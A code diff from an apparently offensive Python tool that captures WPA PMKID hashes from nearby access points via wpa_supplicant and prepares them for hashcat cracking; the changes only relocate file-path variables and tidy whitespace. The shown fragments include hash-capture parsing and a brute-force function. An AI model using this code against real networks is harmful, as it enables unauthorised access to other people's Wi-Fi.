@@ -45,6 +45,10 @@ wlan_mac = ('cat /sys/class/net/' + interface + '/address').split()
 commsupp = ('timeout ' + scan + ' wpa_supplicant -c wpa_supp.conf -i ' + interface + ' -dd').split()
 commsupp2 = ('timeout ' + timeout + ' wpa_supplicant -c wpa_supp.conf -i ' + interface + ' -dd').split()
 
+wpa_supp = "wpa_supp.conf"
+hashcatfile = 'hashcat16800.hash'  # change here hashcat file location
+potfile = 'pmkidGetCat.potfile'  # change here hashcat potfile location
+
 
 def run_command(command):
  
@@ -57,11 +61,6 @@ def run_command(command):
 def mac_get():
     for meck in run_command(wlan_mac):
         return meck.strip().replace(":","")
-
-
-wpa_supp = "wpa_supp.conf"
-hashcatfile = 'hashcat16800.hash'  # change here hashcat file location
-potfile = 'pmkidGetCat.potfile'  # change here hashcat potfile location
 
 
 def f_works(f_name, f_data):
@@ -95,7 +94,6 @@ def hcl():
 
         if 'selected BSS' in line:
             macap = (line[23:][:17].replace(":", ""))
-
 
         if 'PMKID from' in line:
             pmkid = (line[49:].replace(" ", ""))
@@ -146,7 +144,6 @@ def to_brute(pmkid, msg, essid, sem):
 
 
 f_works(wpa_supp, "")
-
 aps = []
 name_mac ={} 
 
@@ -158,6 +155,7 @@ for line in run_command(commsupp):
     if 'Could not read interface' in line:
         print("[!] " + line + "\n" )
         sys.exit()
+
     elif 'rfkill: WLAN soft blocked' in line:
         print("[!] " + line + "\n" )
         sys.exit()
@@ -172,7 +170,7 @@ for line in run_command(commsupp):
 
 for ess_id in name_mac:
     print("[!] Found AP: " + ess_id + " trying get hash...\n")
-        #edit_conf(ess_id)
+
     f_works(wpa_supp, ess_id)
     hash_list=hcl()
 
